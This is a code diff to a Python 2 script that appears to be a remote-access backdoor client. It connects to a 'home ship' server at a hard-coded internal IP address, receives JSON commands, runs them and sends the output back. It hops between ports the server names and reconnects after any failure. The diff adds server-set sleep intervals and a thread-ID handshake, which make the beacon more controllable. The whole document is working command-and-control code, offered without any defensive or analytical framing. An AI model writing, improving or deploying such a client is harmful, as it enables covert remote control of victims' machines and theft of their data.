@@ -3,10 +3,12 @@
 import socket,subprocess,time,getpass,fcntl,struct,os,json,sys
 from cStringIO import StringIO
 
-HOST = "127.0.0.1"     # The home ship
-STATICPORT = 31368     # The same port as used by the server
-PORT = -1
+HOST = "10.2.246.174"     # The home ship
+STATICPORT = 31339     # The same port as used by the server
+PORT = STATICPORT
 SCRIPTNAME = os.path.basename(__file__)
+SLEEPTIME = 3 # default sleep time
+THREAD_ID = -1
 
 def readuntil(s):
 	b = ""
@@ -16,15 +18,15 @@ def readuntil(s):
 
 def migratePorts(port, data):
 	PORT = int(port)
-	time.sleep(3)
+	time.sleep(SLEEPTIME)
 	print "[~] Migrating to {0}".format(PORT)
 
 	global s
 	s.close()
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.settimeout(5)
+	s.settimeout(SLEEPTIME)
 	s.connect((HOST, PORT))
-	s.send(json.dumps({"data": data})+chr(255))
+	s.send(json.dumps({"data": data, "tid": THREAD_ID})+chr(255))
 
 def code(command, port):
 	if command:
@@ -45,7 +47,7 @@ def code(command, port):
 			migratePorts(port, output)
 		except:
 			s.close()
-			time.sleep(5)
+			time.sleep(SLEEPTIME)
 			main()
 	except:
 		pass
@@ -53,19 +55,29 @@ def code(command, port):
 
 def main():
 	global s
+	global PORT
+	global STATICPORT
+	global SLEEPTIME
+	global THREAD_ID
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.settimeout(5)
-		s.connect((HOST, STATICPORT))
+		s.settimeout(SLEEPTIME)
+		s.connect((HOST, PORT))
+		s.send(json.dumps({"tid": THREAD_ID})+chr(255))
 
 		while(1):
 				data = readuntil(s)[:-1]
 				data = json.loads(data)
+				if "sleep" in data:
+					SLEEPTIME = int(data["sleep"])
+				if THREAD_ID == -1 and "tid" in data:
+					THREAD_ID = int(data["tid"])
 				code(data["code"], data['newport'])
-	except:
-		time.sleep(5)
+	except Exception as ex:
+		print "Error:", ex
+		PORT = STATICPORT
+		time.sleep(SLEEPTIME)
 
 	main()
 
 main()
-
